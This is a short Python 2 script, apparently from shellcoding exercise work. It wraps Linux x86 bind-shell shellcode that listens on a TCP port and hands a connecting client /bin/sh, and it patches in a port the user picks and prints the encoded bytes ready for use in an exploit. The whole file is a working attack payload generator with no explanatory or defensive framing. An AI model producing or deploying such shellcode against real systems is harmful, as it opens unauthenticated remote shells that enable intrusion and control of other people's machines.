#!/usr/bin/python
# The below shellcode listens on 44510
print 'Usage: ./wrapper.py <port-no>' + '\n'
print 'Kindly use port greater than 1024' + '\n'

import sys

shellcode  = ""
shellcode  = "\x29\xc0\x29\xdb\x99\xfe\xc3\x50\x53\x6a\x02\x89\xe1\xb0"
shellcode += "\x66\xcd\x80\x89\xc6\x52\x66\x68\xad\xde\xfe\xc3\x66\x53"
shellcode += "\x89\xe1\x6a\x10\x51\x56\xb0\x66\x89\xe1\xcd\x80\x53\x56"
shellcode += "\x89\xe1\x01\xdb\xb0\x66\xcd\x80\x52\x52\x56\xfe\xc3\x89"		# Don't modify shellcode variable
shellcode += "\xe1\xb0\x66\xcd\x80\x89\xc7\x29\xc9\xb0\x3f\x89\xfb\x80"
shellcode += "\xf9\x01\xcd\x80\xfe\xc1\x79\xf3\xb0\x0b\x52\x68\x2f\x2f"
shellcode += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

shellcode1 = []
l = 0

port = int(sys.argv[1]) #Port no

port = hex(port)		

encoded=""

for i in bytearray(shellcode):
	l+=1
	shellcode1.append(i)

if len(port[2:]) == 3:
	b1 = port[2:][1:]
	b2 = port[2:][:1]

	s1 = int(b2 , 16)
	s2 = int(b1 , 16)

	shellcode1[22] = s1
	shellcode1[23] = s2

else:
	b1 = port[2:][2:]
	b2 = port[2:][:2]

	s1 = int(b2 , 16)
	s2 = int(b1 , 16)

	shellcode1[22] = s1
	shellcode1[23] = s2

ptr = 0

for i in bytearray(shellcode1):
	ptr += 1
	if i != 0:
		encoded += "\\x"
		encoded += "%02x" %i
	else:
		print 'Shellcode has null byte at:%d' %ptr
		break

print 'Shellcode length:%d\n' %len(shellcode1)
print '\"' + encoded + '\"' + '\n' 
